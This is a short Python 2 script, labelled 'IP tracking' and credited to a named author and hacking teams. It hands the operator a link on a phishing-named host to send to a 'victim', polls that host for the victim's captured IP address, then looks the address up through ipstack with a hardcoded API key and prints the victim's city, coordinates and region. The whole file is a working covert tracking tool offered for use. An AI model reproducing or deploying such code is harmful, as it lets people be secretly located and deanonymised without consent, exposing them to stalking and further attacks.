import requests, random, json, sys, time, os


api_key = '2388107e74e7fe5424554967771b568b';
rand = random.randint(000, 999)
url = 'https://server-phising.000webhostapp.com/ip.php?rand='+str(rand)

banner = '''
 __ _____
|  |  |  |
|  |   __|
|  |  |
|__|__| tracking

 --------------------------
|  author : heri setyawan  |
|  create : 10/04/2019     |
 --------------------------
|     PhoenixCyberTeam     |
|     Famousxploitteam     |
 --------------------------
'''

print banner

print 'Send tour victim : '+url
a = raw_input('Tab for continue...')

p = 1
while p <= 9999:
 	p += 1
 	ip = requests.get('https://server-phising.000webhostapp.com/ip_'+str(rand)+'.txt')
 	if ip.status_code == 200:
 		urls = 'http://api.ipstack.com/'+str(ip.text)+'?access_key='+str(api_key);
 		result = requests.get(urls);
		break;
 	else:
		sys.stdout.write('-')
		time.sleep(1)

if sys.platform == 'win32':
	os.system('cls')
else:
	os.system('clear')
print banner

data =  json.loads(result.text)
print 'ip victim : '+data['ip']
print 'type ip : '+data['type']
print 'continent_code : '+data['continent_code']
print 'continent_name : '+data['continent_name']
print 'country_code : '+data['country_code']
print 'country_name : '+data['country_name']
print 'region_code : '+data['region_code']
print 'region_name : '+data['region_name']
print 'city : '+data['city']
print 'zip : '+str(data['zip'])
print 'latitude : '+str(data['latitude'])
print 'longitude : '+str(data['longitude'])
print 'location : '
print '		-number code : '+str(data['location']['calling_code'])
print '		-geoname_id : '+str(data['location']['geoname_id'])
print '		-capital : '+str(data['location']['capital'])
print '		-country_flag : '+str(data['location']['country_flag'])
print '		-languages : '
for i in data['location']['languages']:
	print '			-code : '+i['code']
	print '			-name : '+i['name']
	print '			-native'+i['native']
